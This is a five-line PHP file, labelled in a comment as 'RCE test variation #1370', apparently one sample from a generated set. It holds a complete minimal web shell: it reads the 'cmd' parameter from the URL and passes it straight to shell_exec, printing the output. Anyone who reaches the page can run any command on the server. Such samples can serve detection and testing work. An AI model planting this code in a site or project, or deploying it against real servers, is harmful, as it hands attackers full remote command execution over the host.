<?php
// RCE test variation #1370
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>